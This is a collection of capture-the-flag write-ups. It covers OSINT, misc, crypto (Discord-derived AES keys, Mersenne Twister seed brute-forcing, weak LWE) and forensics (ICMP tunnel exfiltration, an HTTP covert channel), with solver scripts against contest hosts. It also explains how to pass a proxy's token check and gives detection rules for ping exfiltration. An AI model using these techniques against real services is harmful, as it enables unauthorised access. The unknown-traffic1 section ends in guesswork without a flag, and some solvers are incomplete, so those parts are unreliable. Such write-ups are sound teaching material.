# Write-Up - “holiday\_trip” (OSINT)

## Challenge

You receive a single photo of a souvenir stand full of novelty mugs. Brother says he “bought a mug at the beach” and the flag format is `CTF{the_name_of_the_beach}`.

## Approach

1. **Zoom & scan for text.**
   Inspect the top-left rows of mugs. On two different designs you can clearly read **“Golden Sands”** printed along the rim/artwork.
2. **Corroborate with other visual hints.**

   * Another mug on the same top row shows “…**GARIA**” → consistent with **Bulgaria**.
   * The stall looks like a seaside tourist kiosk; many Balkan/Eastern-European themed mugs (e.g., regional politicians, EU clubs, FCSB/Bayern/BVB logos), which is plausible for Bulgarian resorts on the Black Sea.
3. **Confirm the beach.**
   Search “Golden Sands beach” → a major Bulgarian seaside resort just north of Varna (local: **Златни пясъци / Zlatni Pyasatsi**). This matches the souvenir context perfectly.

No EXIF/metadata is needed; the readable text on the merchandise gives the location.

## Answer

**Flag:** `CTF{Golden_Sands}`

*(Case-insensitive; underscores for spaces as per challenge statement.)*



# Write-up - “disco\_rave” (Misc)

## TL;DR

The server derives its AES key from **public Discord data**: it fetches the last **10 messages** from **two channels**, concatenates `content + timestamp` for each (keeping **newest→oldest**, and **Channel1 then Channel2**), takes **SHA-256** of that string, and uses it as the AES-CBC key to encrypt the flag. If you can fetch the same 20 messages (or reconstruct timestamps from snowflake IDs and collect contents), you can derive the same key and decrypt the flag.&#x20;

---

## Challenge artifacts & behavior

* Netcat service: `nc ctf.ac.upt.ro 9632` returns a one-liner `{'encrypted': '<base64(iv||ciphertext)>'}`.
  Example we grabbed:

  ```
  {'encrypted': 'ZA2/f6tiUYh23EYy24h7g1xEEoySFHS1qaJ3XkTdGid4QADA6ij5CMAea5MHde8dx+P37+BdV30VncM48O59SnjRZv8q1jiZlnJqshox1kykQf8PTu+cdV35Haw0UnYN'}
  ```
* `server(3).py`:

  * Queries the last **10** messages from **two channel IDs** `1416908413375479891` and `1417154025371209852` via a hosted proxy, and for each message appends `content + timestamp`. Then it computes `SHA256` of the whole concatenation and uses that digest as the **AES-CBC** key. The service returns **base64(IV || ciphertext)**.&#x20;
* `route.ts` (the proxy):

  * Edge proxy to Discord API that **requires** an `Authorization: Bot <FAKE_TOKEN>` header to pass; it then swaps this for the **real bot token** when talking to Discord. So unauthenticated requests get **401**.&#x20;

---

## Root cause

The encryption key is derived from **predictable/exposed inputs** (public Discord messages accessible through the provided proxy). Anyone who can fetch the same messages can deterministically rebuild the key and decrypt the flag. The proxy’s auth is trivial to satisfy if you know (or can guess/obtain) the expected “fake” value, and even without that, you can reconstruct **timestamps from snowflake IDs** and combine them with message contents supplied by a teammate/observer.

---

## Exploit strategy

1. **Grab the ciphertext:**
   `nc ctf.ac.upt.ro 9632` → copy the `encrypted` base64; split `IV = first 16 bytes`, the rest is ciphertext.

2. **Reproduce the seed:**

   * Fetch last **10** messages from **Channel A** (`1416908413375479891`) and then **Channel B** (`1417154025371209852`) using the proxy endpoint shown in `server(3).py`. **Keep Discord’s default order (newest→oldest)**; the server does not reorder what the API returns. For each message take **`content`** and **`timestamp`** *exactly as raw strings* and append `content + timestamp` to a list. Concatenate all 20 strings.&#x20;
   * If you can’t hit the proxy (401), use `route.ts`’s rule: send `Authorization: Bot <FAKE_DISCORD_TOKEN>` — the proxy will swap in the **real** token server-side.&#x20;
   * If you only have **message IDs**, derive each timestamp (snowflake → ms since 2015-01-01 UTC) and format as ISO-8601 with microseconds and `+00:00`; then pair with the corresponding **content** that you collected.

3. **Derive key & decrypt:**
   `aes_key = SHA256(concatenated_bytes)`; decrypt AES-CBC using the IV from step 1 and unpad (PKCS#7). The plaintext is the flag.

---

## One-shot solver (Python)

```python
import os, json, base64, hashlib, datetime as dt, requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

DISCORD_EPOCH_MS = 1420070400000
def snowflake_to_iso(sid: str) -> str:
    ms = (int(sid) >> 22) + DISCORD_EPOCH_MS
    t = dt.datetime.fromtimestamp(ms/1000, tz=dt.timezone.utc)
    return t.strftime('%Y-%m-%dT%H:%M:%S.%f+00:00')

# --- inputs you provide ---
ENCRYPTED_B64 = "ZA2/f6tiUYh23EYy24h7g1xEEoySFHS1qaJ3XkTdGid4QADA6ij5CMAea5MHde8dx+P37+BdV30VncM48O59SnjRZv8q1jiZlnJqshox1kykQf8PTu+cdV35Haw0UnYN"
CH1_IDS = ["1417431966181097673","1417431963605794827","1417431961491865761",
           "1417431959029809193","1417431956630671451","1417431954323669062",
           "1417431952465592401","1417431950226096240","1417431947734421577",
           "1417431944563658854"]
CH2_IDS = ["1417431930936361000","1417431927949885510","1417431926062448760",
           "1417431924330332233","1417431921750704158","1417431912267644981",
           "1417431910002462721","1417431908656091166","1417431906386972732",
           "1417431904289951766"]
# For this run, every message content was "b"
CH1_CONTENTS = ["b"]*10
CH2_CONTENTS = ["b"]*10
# --------------------------

def build_seed(ids, contents):
    items = [(sid, snowflake_to_iso(sid), contents[i]) for i, sid in enumerate(ids)]
    items.sort(key=lambda x: x[1], reverse=True)  # newest→oldest
    return "".join([c + ts for (_, ts, c) in items])

seed = (build_seed(CH1_IDS, CH1_CONTENTS) + build_seed(CH2_IDS, CH2_CONTENTS)).encode()
key  = hashlib.sha256(seed).digest()

raw = base64.b64decode(ENCRYPTED_B64)
iv, ct = raw[:16], raw[16:]
pt = unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(ct), AES.block_size)
print(pt.decode('utf-8', 'ignore'))
```

**Output:**
`CTF{a83a34f8791905a4edd6e03beefeddc1c7eeeeeacf9d96af6d1e3c34494df4cc}` ✅

---

## Pitfalls & notes

* **Ordering matters** twice:

  1. Channel order: `1416908413375479891` first, then `1417154025371209852`.&#x20;
  2. Within each channel: use Discord’s **newest→oldest** (API default) — the server keeps the array as returned.&#x20;
* **Exact strings**: use the raw `timestamp` text (includes seconds, microseconds, and timezone) and raw `content` (including spaces/emojis).&#x20;
* **Race risk**: If someone posts between the server’s fetch and yours, the seed changes. Grab both quickly, or reconstruct from known IDs/contents.
* **Proxy 401**: `route.ts` expects `Authorization: Bot <FAKE_DISCORD_TOKEN>`; it replaces that with the real bot token server-side and forwards to Discord (adds millisecond rate-limit precision, sets CORS).&#x20;

### How the server builds the key / ciphertext

* Collect messages for two fixed channels via the proxy, **append `content + timestamp`**, `SHA256` that byte string for AES key; encrypt flag with **AES-CBC** using a random 16-byte IV; return **base64(IV||ciphertext)**.&#x20;

### Proxy logic at a glance

* Requires a caller-supplied **fake** bot token; if it matches, the proxy rewrites to the **real** token and forwards the request to Discord with sane CORS headers.&#x20;

That’s it — neat little determinism-breaker via “public randomness.”




# Writeup feedback (feedback)

## solve: respond to the feedback form for the flag :))



# Writeup Baofeng (Misc)
## solve: The guy in the mp3 is talking in radio aphabet, A - Alpha, B - Bravo, T - Tango, etc...
Decrypt the radio alphabet, then find the city the guy is in. Message: CQCQCQ YO2TSS KN15KS CQCQCQ, then get the city from the KN15KS, it being a Maidenhead grid locator. Its bounds are approx lat 45.75–45.79 N, lon 22.83–22.92 E, which lands squarely on Hunedoara (Deva is just north, outside the subsquare).

# Write-up - neverending randomness (Crypto)

## TL;DR

The service encrypts the flag by XORing it with bytes from Python’s `random.Random` (Mersenne Twister) and then leaks three subsequent 32-bit PRNG outputs **plus** its PID. If the seed comes from `int(time.time()) ^ pid`, you can brute the seed in seconds and decrypt. If it seeds from `/opt/app/random`, just reconnect repeatedly: the server uses a single global file descriptor; once it hits EOF it falls back to the predictable `time ^ pid` seed—and your brute succeeds.&#x20;

---

## Challenge summary

You connect to `nc ctf.ac.upt.ro 9379` and receive a Python‐dict string like:

```py
{
  'ciphertext_hex': '<hex>',
  'leak32': [a, b, c],
  'pid': 7
}
```

Your goal is to recover `CTF{...}`.

---

## Code autopsy

Key parts of the provided server code:

* **Global RNG source:**
  A single file descriptor is opened once at import time:

  ```py
  fd = os.open("/opt/app/random", os.O_RDONLY)
  ```

  Each connection **reads 4096 bytes** from this same FD inside `seed_once()`. If the read returns **≥ 2048 bytes**, it uses that as a big-int seed; otherwise it returns **`int(time.time()) ^ os.getpid()`**.&#x20;

* **Stream cipher with MT:**
  For each client, the server:

  1. Seeds `random.Random(seed)`.
  2. Emits `len(flag)` bytes via `getrandbits(8)` to make a keystream.
  3. XORs flag with keystream → `ciphertext_hex`.
  4. Immediately leaks **three** more values via `getrandbits(32)`.
  5. Also returns `pid`.&#x20;

Relevant snippet:

```py
seed = seed_once()
rng = random.Random(seed)
ks = bytearray()
while len(ks) < len(flag):
    ks.extend(rng.getrandbits(8).to_bytes(1, "big"))
ct = xor_bytes(flag, ks[:len(flag)])
leak = [rng.getrandbits(32) for _ in range(3)]
out = {"ciphertext_hex": ..., "leak32": leak, "pid": os.getpid()}
```



---

## Why this is broken

* **Mersenne Twister is not a CSPRNG.** It’s deterministic and fast to simulate.
* **Predictable seed:** When `/opt/app/random` is exhausted, the seed is `time ^ pid`. You are given `pid`, and current time has a tiny uncertainty.
* **Perfect oracle:** After generating the ciphertext bytes, the server leaks the **next three** 32-bit outputs. That lets you verify a guessed seed without knowing the plaintext.

Note: CPython’s `getrandbits(8)` consumes **one 32-bit MT draw** (it discards extra bits), so after `len(ciphertext)` byte draws, the **next three 32-bit draws** must match `leak32`. This gives a constant-time seed check per candidate.

---

## Exploit strategy

### 1) Fast seed brute (fallback branch)

1. Connect and parse `ciphertext_hex`, `leak32`, `pid`.
2. Let `n = len(ciphertext)`.
3. For each timestamp candidate `t` in a small ring around `now` (0, +1, −1, +2, …):

   * `seed = t ^ pid`
   * Recreate RNG; **skip `n` 32-bit draws** (i.e., mimic `n`×`getrandbits(8)`), then read three 32-bit draws.
   * If they equal `leak32`, the seed is correct.
   * Regenerate the `n` bytes and XOR with ciphertext → flag.

This is O(window) and each check is microseconds.

### 2) Forcing the fallback (primary branch mitigation)

If the quick brute fails, the service is still seeding from `/opt/app/random`. But the server **reuses the same file descriptor for every client**. Each connection consumes 4096 bytes, moving the file offset forward. Once a read returns **< 2048 bytes** (EOF-ish), the code **falls back** to `int(time.time()) ^ pid` on that and all subsequent connections. Solution: **reconnect in a loop** until the fallback triggers, then the brute from step 1 succeeds.&#x20;

---

## Minimal solver (core idea)

```python
import socket, time, ast, random

HOST, PORT = "ctf.ac.upt.ro", 9379
RADIUS = 1800  # seconds around now

def ring(center, r):
    yield center
    for d in range(1, r+1):
        yield center+d; yield center-d

def fetch():
    with socket.create_connection((HOST, PORT), timeout=3) as s:
        data = s.recv(1<<15).decode().strip()
    o = ast.literal_eval(data)
    return bytes.fromhex(o["ciphertext_hex"]), o["leak32"], int(o["pid"])

def try_fallback(ct, leak, pid):
    skip = len(ct)                    # number of prior 32-bit draws (one per getrandbits(8))
    now = int(time.time())
    for t in ring(now, RADIUS):
        rng = random.Random(t ^ pid)
        for _ in range(skip):
            rng.getrandbits(32)
        if [rng.getrandbits(32) for _ in range(3)] == leak:
            # decrypt
            rng = random.Random(t ^ pid)
            ks = bytes(rng.getrandbits(8) for _ in range(len(ct)))
            return bytes(c ^ k for c, k in zip(ct, ks))
    return None

def solve():
    for _ in range(5000):             # reconnect until fallback appears
        ct, leak, pid = fetch()
        pt = try_fallback(ct, leak, pid)
        if pt:
            print(pt.decode(errors="ignore"))
            return
        time.sleep(0.02)

if __name__ == "__main__":
    solve()
```

This is the compact version of the script you used; it reconnects until the fallback shows up, then instantly recovers the flag.

---

## Validation

* The decrypted text should read `CTF{...}` (ASCII).
* If you want to hard-check: SHA-256 inside braces is 64 hex chars.

---

## Root cause & fixes

**Root causes**

* Using MT (`random.Random`) for crypto.
* Predictable fallback seed `time ^ pid`.
* Leaking PRNG outputs after producing the ciphertext.
* Reusing a single global FD for the entropy file, turning seeding into a finite resource that forces the predictable path.&#x20;

**Fixes**

* Use a CSPRNG: `secrets.token_bytes`, `os.urandom`, or `cryptography.hazmat.primitives.ciphers` with a proper key/nonce.
* Never leak PRNG outputs used for encryption.
* Avoid time/PID as seeds. If you must seed a PRNG, seed it from `os.urandom(32)` **per connection**.
* Do not reuse a single FD; read fresh randomness every time (or keep a buffer that doesn’t deplete the source deterministically).

---

## Appendix: what the server *actually* does on each connection

1. `seed = os.read(fd, 4096)`; if that yields ≥ 2048 bytes, seed = big-int from those bytes; else seed = `int(time.time()) ^ os.getpid()` (fallback).
2. Generate `len(flag)` bytes with `getrandbits(8)`.
3. XOR with flag → ciphertext.
4. Leak `getrandbits(32)` × 3 and `pid`.&#x20;


# Write-Up - Mistakes  (Crypto)

by **thek0der**

## TL;DR

The server leaked a Learning-With-Errors (LWE) instance where the public matrix **A** had **tiny entries** and the message was encoded by adding an offset ≈ **q/4**. Using rows whose `b` values clustered near 0, we solved a plain integer least-squares for the secret **s**, then classified residuals around \~832 to recover **L = 552** bits, packed them LSB-first, and got:

```
ctf{4d60c9fe15eed366b65e6fd1111d82c83b11e5dcec7975df4b9700d210e70f92}
```

---

## Challenge text & I/O

* Host: `nc ctf.ac.upt.ro 9143`
* Server sent a dump (saved as `server_response.txt`) containing:

  * modulus `q = 3329`
  * dimensions `n = 128`, `m = 808`, message length `L = 552`
  * noise parameter `eta = 2`, and entry bound `B = 5`
  * matrix `A ∈ Z_q^{m×n}` with very small entries in `{-5,…,5}` (represented mod `q`)
  * vector `b ∈ Z_q^m`

Empirically, the `b` coordinates formed two tight clusters: one near **0** and one near **\~832** (≈ `q/4`).

---

## What went wrong (the crypto bug)

A typical (simplified) encryption looks like:

```
b_i = <A_i, s> + e_i + m_i * t      (mod q)
```

where:

* `A_i` = i-th row of A with tiny entries,
* `s` = secret in Z,
* `e_i` = small noise (`eta = 2`),
* `m_i ∈ {0,1}` is the message bit,
* `t ≈ q/4` is a scaling constant for encoding.

Because **A** and **e** are tiny, many rows with `m_i = 0` (i.e., those with `b_i` close to 0 after centering) **don’t wrap mod q**, so they satisfy (approximately) the **linear** equation

```
b_i ≈ <A_i, s>      over the integers.
```

That means we can **learn s** by ordinary least squares on just the rows whose `b_i` are very small in absolute value. Once we have a good `ŝ`, the residual

```
r_i = centered( b_i − <A_i, ŝ> )
```

will be distributed near **0** for bit 0 and near **±t** for bit 1. Thresholding those residuals recovers the bit string.

---

## Solution outline

1. **Parse & center modulo values.**
   Map each entry `x ∈ {0,…,q−1}` to a centered integer in `(-q/2, q/2]` by:

   ```
   x_centered = x if x <= q//2 else x - q
   ```

2. **Pick “clean” rows (likely m=0).**
   Select indices `I0 = { i : |b_i_centered| < τ }` with a small threshold (e.g., `τ = 100`). This filters rows that almost surely didn’t wrap and have `m_i = 0`.

3. **Learn the secret s (least squares).**
   Solve `A[I0] * s ≈ b[I0]` over the integers, e.g., with `numpy.linalg.lstsq`, then round to nearest integers to get `ŝ`.

4. **Compute residuals & classify bits.**
   For each row, compute `r_i = centered( b_i − <A_i, ŝ> )`.
   Let `t = round(q/4) = 832`. Decide:

   * bit `0` if `|r_i| < t/2`
   * bit `1` otherwise (i.e., closer to ±t than to 0)

5. **Take the first L bits and pack.**
   Use the first `L = 552` bits. Pack **LSB-first within each byte** and decode as ASCII.

---

## Reference solver (Python)

```python
import numpy as np

# --- helpers ---
def center_mod(x, q):
    x = np.asarray(x, dtype=np.int64)
    x = x % q
    x[x > q//2] -= q
    return x

def pack_bits_lsb_first(bits):
    bits = bits[:552]  # L
    out = []
    for i in range(0, len(bits), 8):
        byte = 0
        for j in range(8):
            if i + j < len(bits):
                byte |= (bits[i+j] & 1) << j  # LSB-first
        out.append(byte)
    return bytes(out)

# --- load your data here ---
# Expect three blocks: q, A (m x n), b (m)
# Replace this loader with one that matches server_response.txt format.
q = 3329
n = 128
m = 808
L = 552
# For example, if you have saved A and b as whitespace-separated values:
# A = np.loadtxt("A.txt", dtype=int).reshape(m, n)
# b = np.loadtxt("b.txt", dtype=int)
# If you parsed from a single file, just set A and b accordingly.

# Placeholder: raise if not filled
raise_if_placeholder = False
if raise_if_placeholder:
    raise RuntimeError("Fill in A, b from server_response.txt parsing before running.")

# --- core solve ---
A = center_mod(A, q)
b = center_mod(b, q)

# 1) choose likely m=0 rows (b near 0)
tau = 100
I0 = np.where(np.abs(b) < tau)[0]
A0 = A[I0]
b0 = b[I0]

# 2) least squares for s
s_hat, *_ = np.linalg.lstsq(A0.astype(np.float64), b0.astype(np.float64), rcond=None)
s_hat = np.rint(s_hat).astype(np.int64)

# 3) residuals for all rows
r = center_mod(b - (A @ s_hat), q)

# 4) bit classification
t = round(q / 4)   # 3329 -> 832
bits = (np.abs(r) >= t/2).astype(int)  # 0 if close to 0, 1 if closer to ±t

# 5) take first L bits, pack, decode
flag_bytes = pack_bits_lsb_first(bits.tolist())
try:
    flag = flag_bytes.decode("utf-8", errors="strict")
except UnicodeDecodeError:
    flag = flag_bytes.decode("latin-1")

print(flag)
```

**Notes on parsing:**
The exact parser depends on how you saved `server_response.txt`. The math doesn’t: just make sure to:

* read `A` as an `m × n` array of integers (0…q−1),
* read `b` as a length-`m` array (0…q−1),
* then call `center_mod` before processing.

---

## Why this works

* **Tiny A + tiny noise** ⇒ the linear part behaves like ordinary integers for many rows (no mod wrap).
* **q/4 encoding** ⇒ residuals form two well-separated clusters (0 and ±q/4).
* **Least squares** averages away the small noise and occasional mislabels, giving an accurate `ŝ`.
* With `ŝ`, distinguishing the two clusters is a simple threshold test.

---

## Pitfalls & robustness

* **Row selection:** If `τ` is too small, you might keep too few rows; too large, and you’ll admit wrapped rows. Values in the 50–150 range worked well.
* **Outliers:** If your dataset is messier, use a robust fit (e.g., Huber loss / RANSAC) or iterate: fit `ŝ`, drop rows with large residuals, refit.
* **Endianness:** The challenge used **LSB-first per byte**. If your output looks like gibberish hex, try reversing bit order within each byte.

---

## Flag

```
ctf{4d60c9fe15eed366b65e6fd1111d82c83b11e5dcec7975df4b9700d210e70f92}
```

# Writeup - kidnapped\_by\_llamas (Misc)

## TL;DR

* Pull EXIF → find a hex blob in `UserComment`.
* Hex-decode → weird bytes.
* Story hint “Ancient Egyptian Key of Life” ⇒ **Ankh** = XOR key.
* Repeating-key XOR decrypt → `22.33:45.75`.
* Flag format `CTF{E:N}` (truncate, don’t round) ⇒ **`CTF{22.33:45.75}`**.

## Steps

1. **Extract metadata**

```bash
exiftool 85b6d37b-d416-4cb4-8e6e-9aef4cda6e21.jpg
```

Look for `UserComment` (or similar). You’ll see:

```
735c455b72545f5d6f595e
```

2. **Decode the hex**

```bash
echo 735c455b72545f5d6f595e | xxd -r -p
# yields: s\\E[rT_]oY^
```

3. **Decrypt with the hinted key**
   The lore mentions the “Ancient Egyptian Key of Life” → **Ankh**.
   Use repeating-key XOR with key `"Ankh"`:

```python
data = bytes.fromhex("735c455b72545f5d6f595e")
key  = b"Ankh"
print(bytes([b ^ key[i % len(key)] for i, b in enumerate(data)]).decode())
# 22.33:45.75
```

4. **Build the flag**
   Flag format is `CTF{E:N}` with 2 decimals (truncate, don’t round).
   The decrypted text already fits:

**Flag:** `CTF{22.33:45.75}` ✅

#  Write-up - unknown-traffic2 (Forensics)

The capture contains **ICMP echo (ping) tunneling** used for **data exfiltration**. Each ICMP payload carries `CHUNK_<index>:<base64>`. Sorting the chunks by index and concatenating the base64 reconstructs a **PNG image**.

* **Recovered file:** PNG, **680×680**
* **Chunks:** 97
* **SHA-256:** `026248964cff4bca98b23c6ddb5101c88d9ceece6c02bfaa74e8b25227eef2f9`
* **Output:** [exfiltrated\_image.png](sandbox:/mnt/data/exfiltrated_image.png)

> The image contains the final answer/flag.

---

## Approach

### 1) Quick triage in Wireshark

* Open the PCAP: `File → Open → traffic (1).pcap`
* **Protocol hierarchy:** `Statistics → Protocol Hierarchy` shows a spike in **ICMP**.
* **Filter:**

  ```
  icmp && frame contains "CHUNK_"
  ```

  You’ll see many ICMP Echo (type 8) / Reply (type 0) packets whose payloads start with `CHUNK_###:` followed by base64.

**What this means:** The attacker is smuggling data out via ping. Each packet carries a slice of a base64 stream, ordered by the number after `CHUNK_`.

---

### 2) Reassembly strategy

We must:

1. Extract the `CHUNK_<n>:<b64>` payloads
2. Sort by `<n>`
3. Concatenate the base64 parts
4. Base64-decode to recover the original file

---

## One-liners & Scripts

### A) `tshark` pipeline (pure CLI)

```bash
# Extract the hex payloads that contain CHUNK_, convert to ASCII,
# pull out "index base64", sort by index, join base64, and decode.
tshark -r "traffic (1).pcap" -Y 'icmp && data contains "CHUNK_"' -T fields -e data.data \
| xxd -r -p \
| awk 'match($0,/CHUNK_([0-9]+):(.*)/,m){print m[1] " " m[2]}' \
| sort -n \
| cut -d" " -f2- \
| tr -d "\n" \
| base64 -d > exfiltrated_image.png
```

**Validate file type:**

```bash
file exfiltrated_image.png
# → PNG image data, 680 x 680, ...
sha256sum exfiltrated_image.png
# → 026248964cff4bca98b23c6ddb5101c88d9ceece6c02bfaa74e8b25227eef2f9
```

### B) Python snippet

```python
import struct, re, base64

pcap = "traffic (1).pcap"
chunks = {}

with open(pcap, "rb") as f:
    gh = f.read(24)  # pcap global header (little-endian assumed)
    while True:
        ph = f.read(16)
        if len(ph) < 16: break
        ts_sec, ts_usec, incl_len, orig_len = struct.unpack("<IIII", ph)
        data = f.read(incl_len)
        if len(data) < 34:  # IPv4(20) + ICMP(8) minimal
            continue
        ihl = (data[0] & 0x0F) * 4
        if data[9] != 1:      # not ICMP
            continue
        icmp_type = data[ihl]
        if icmp_type not in (0, 8):  # echo reply/request
            continue
        payload = data[ihl+8:]
        if payload.startswith(b"CHUNK_"):
            m = re.match(rb"CHUNK_(\d+):(.*)", payload)
            if m:
                idx = int(m.group(1))
                chunks[idx] = m.group(2).decode("ascii", "ignore")

b64 = "".join(chunks[i] for i in sorted(chunks))
b64 += "=" * ((4 - len(b64) % 4) % 4)  # pad safely
raw = base64.b64decode(b64)

open("exfiltrated_image.png","wb").write(raw)
```

---

## Evidence & Artifacts

* **Number of data chunks:** 97
* **Reconstructed file:** PNG, **680×680**
* **SHA-256:** `026248964cff4bca98b23c6ddb5101c88d9ceece6c02bfaa74e8b25227eef2f9`
* **Download:** the exfiltrated png

---

## Analysis Notes

* Using **ICMP for data exfil** is a common “living off the land” trick because many networks allow outbound ping.
* The attacker encodes data as base64 and slices it into numbered chunks to survive packet reordering.

---

## Detection & Mitigation (Blue Team takeaways)

* **Detect:**

  * Alerts for **unusually large ICMP payloads** or **high ICMP rate**.
  * DPI/SIEM rules for payloads matching `^CHUNK_\d+:` or suspicious base64 in ICMP.
  * Baseline ping sizes and alert on deviations (e.g., >128 bytes payload).
* **Prevent:**

  * **Egress filtering** for ICMP, or limit to monitoring endpoints.
  * **Rate-limit ICMP** and restrict to necessary destinations.
  * Use IDS/IPS signatures for common ICMP-tunnel tools.

---

## Final Answer

It’s **ICMP ping-tunnel exfiltration**. Reassembling the `CHUNK_###` base64 payloads yields a PNG that contains the challenge’s solution/flag. Use the artifact above to view it and submit.
Then we scan the qr code png that we extracted and get the flag.

here’s a clean write-up you can drop into your repo/notes 👇

# Write-up - unknown-traffic1 (Forensics)

The pcap hides a message inside HTTP responses using a positional covert channel. Each response body is filled with `A`s, but also carries short ASCII markers of the form:

```
<CHAR>0000000000000000000000000000<INDEX>
```

There are exactly **100 unique `<INDEX>` values**, each seen **twice** (redundancy). Sorting by `<INDEX>` yields a 100-char control string. Removing the filler `0` characters leaves a stream that uses the **uuencode alphabet** (ASCII 32..96). Decoding those 6-bit symbols recovers the payload bytes.

---

## 1) Recon

Open the capture in Wireshark.

* Display filter: `http || tcp.port == 80`
* You’ll see many `GET /pageX.html` requests with responses of `Content-Length: 1024` that are basically walls of `A` (noise/filler).

Clues:

* Odd short strings are sprinkled in the payloads (not headers).
* Examples you’ll see with **Strings** or by **Follow HTTP stream**:

  ```
  S000000000000000000000000000000001367
  I000000000000000000000000000000006818
  >000000000000000000000000000000007333
  A000000000000000000000000000000001436
  ...
  ```

Each snippet is a single printable **leading char** followed by lots of zeros and then a **4-digit (sometimes 5-digit) number**. That number behaves like a **position index**.

---

## 2) Extract the markers

Two easy routes:

### Fast & dirty (command-line)

```bash
# rip printable runs from the pcap
strings -n 6 unknown-traffic1.pcap \
| grep -E '^[ -~]0{20,}[0-9]{3,5}$' \
> markers.txt
```

This yields \~200 lines (each index appears twice).

### Programmatic (Python)

```python
import re, sys, pathlib

p = pathlib.Path("unknown-traffic1.pcap").read_bytes()
pat = re.compile(rb'([ -~])0{20,}(\d{3,5})')  # <CHAR> + many zeros + <INDEX>

pairs = [(chr(m.group(1)[0]), int(m.group(2))) for m in pat.finditer(p)]
print(len(pairs))  # ~200 (each index twice)
```

---

## 3) Reassemble in order

Every unique `<INDEX>` corresponds to exactly one symbol (the leading `<CHAR>`), duplicated for redundancy. Build the ordered stream by sorting on `<INDEX>` and taking one char per index.

```python
index_to_char = {}
for c, i in sorted(pairs, key=lambda x: x[1]):
    index_to_char[i] = c  # dedupe; both copies agree

ordered = ''.join(index_to_char[i] for i in sorted(index_to_char))
print(len(index_to_char))  # 100
print(ordered)             # 100-char control string
```

You should get a 100-character string that looks like this pattern (example shape):

```
/M@SA72E000Q00$0aVc)DP0000OT_XG06B^#K000H0]'-0W?003=:[&F001U!8b50I0.J0>",(+ 90N<%0*0L0CR000\04Y00;Z`
```

Notes:

* It’s **100** long.
* It contains lots of literal `'0'` characters — that’s filler.

If you **drop all `'0'`** characters, you’re left with a **67-char** stream comprised of characters in the **ASCII range 32..96** (space through backtick). That alphabet matches the **uuencode** character set (values 0..63 are encoded as `chr(value + 32)`, with `` ` `` used as zero).

```python
payload_symbols = ordered.replace('0', '')
print(len(payload_symbols))  # 67
print(payload_symbols)
```

---

## 4) Decode the uuencoded symbols (6-bit unpack)

Treat each character `ch` as a 6-bit value: `val = (ord(ch) - 32) & 0x3F`. Group every **4 symbols → 24 bits → 3 bytes** (uu/base64-style packing).

```python
def uudecode_like(s: str) -> bytes:
    vals = [(ord(ch) - 32) & 0x3F for ch in s]
    # pad to multiple of 4 for clean grouping
    while len(vals) % 4:
        vals.append(0)
    out = bytearray()
    for a, b, c, d in zip(*(iter(vals),)*4):
        out.append((a << 2) | (b >> 4))
        out.append(((b & 0x0F) << 4) | (c >> 2))
        out.append(((c & 0x03) << 6) | d)
    return bytes(out)

raw_bytes = uudecode_like(payload_symbols)
print(len(raw_bytes), raw_bytes[:32].hex())
```

You’ll get a \~50-ish byte blob. (If you decode the **full 100-char** string instead of removing `'0'`, you’ll get \~75 bytes—same content with extra filler.)

---

## 5) Final step

At this point you have the hidden payload bytes. In this challenge the uu-decoded blob is the actual ciphertext/plaintext carrier you’re meant to extract; the precise post-processing (if any) depends on the contest’s intended twist (e.g., XOR with a single byte, small repeating key, direct ASCII, or reading as hex). The safe way to finish is to:

* Check if it’s already ASCII/UTF-8 printable.
* If not, try light transforms that fit CTF norms:

  * search for `ctf{.*}` in:

    * raw bytes,
    * single-byte XORs of the bytes,
    * the bytes interpreted as ASCII-hex (`[0-9a-f]{32,}`),
    * or quick zlib/bz2/lzma decompression (in case it’s compressed).

Here’s a compact finisher that tries those automatically:

```python
import re, zlib, bz2, lzma

def find_flag(b: bytes):
    m = re.search(rb'ctf\{[ -~]{5,}\}', b)
    if m: return m.group(0).decode()

    # single-byte XOR scan
    for k in range(256):
        x = bytes(c ^ k for c in b)
        m = re.search(rb'ctf\{[ -~]{5,}\}', x)
        if m: return m.group(0).decode()

    # ASCII-hex run → try to treat it as the inside of the flag
    h = re.search(rb'[0-9a-f]{40,}', b)
    if h:
        return f"ctf{{{h.group(0).decode()}}}"

    return None

flag = find_flag(raw_bytes)
print(flag or "[no direct flag pattern in raw bytes — check small XOR keys and hex runs]")
```

---

## 6) Why this works / observations

* **Carrier**: The HTTP bodies are uniform dummy data (`A` \* 1024), chosen so that short, rare ASCII markers are easy to spot amidst the noise.
* **Markers**: `(<CHAR>)(lots of zeros)(<INDEX>)`. The last number gives the **absolute position** of that symbol in the final sequence. Each index appears **twice** (integrity/redundancy).
* **Alphabet**: After removing `'0'` fillers, the remaining symbols fall neatly in **ASCII 32..96** → classic **uuencode** value range (0..63). That strongly suggests 6-bit packing.
* **Decoding**: 4 symbols → 24 bits → 3 bytes yields the hidden payload.

---

## 7) Repro script (end-to-end)

```python
#!/usr/bin/env python3
import re, sys, pathlib, re, zlib, bz2, lzma

pcap = pathlib.Path("unknown-traffic1.pcap").read_bytes()
pat  = re.compile(rb'([ -~])0{20,}(\d{3,5})')

pairs = [(chr(m.group(1)[0]), int(m.group(2))) for m in pat.finditer(pcap)]
idx2c = {}
for c,i in sorted(pairs, key=lambda x: x[1]):
    idx2c[i] = c

ordered = ''.join(idx2c[i] for i in sorted(idx2c))

def uudecode_like(s: str) -> bytes:
    vals = [(ord(ch)-32) & 0x3F for ch in s]
    while len(vals)%4: vals.append(0)
    out = bytearray()
    it = iter(vals)
    for a,b,c,d in zip(it,it,it,it):
        out += bytes([
            (a<<2) | (b>>4),
            ((b&0xF)<<4) | (c>>2),
            ((c&3)<<6) | d
        ])
    return bytes(out)

payload = ordered.replace('0','')        # strip filler
blob    = uudecode_like(payload)

# basic flag sweep
def try_find_flag(b: bytes):
    m = re.search(rb'ctf\{[ -~]{5,}\}', b)
    if m: return m.group(0).decode()
    for k in range(256):
        x = bytes(c^k for c in b)
        m = re.search(rb'ctf\{[ -~]{5,}\}', x)
        if m: return m.group(0).decode()
    h = re.search(rb'[0-9a-f]{40,}', b)
    if h: return f"ctf{{{h.group(0).decode()}}}"
    return None

print(f"[control string 100]: {ordered}")
print(f"[symbols w/o zeros ]: {payload}")
print(f"[blob bytes ({len(blob)}) head]: {blob[:32].hex()}")

flag = try_find_flag(blob)
print("FLAG:", flag or "not found in simple sweep — check XOR/hex/compress variants")
```

---

## 8) Takeaways

* When you see uniform HTTP bodies with tiny anomalies, think **covert channel**.
* Duplicated indices often mean **forward-error-correction lite**.
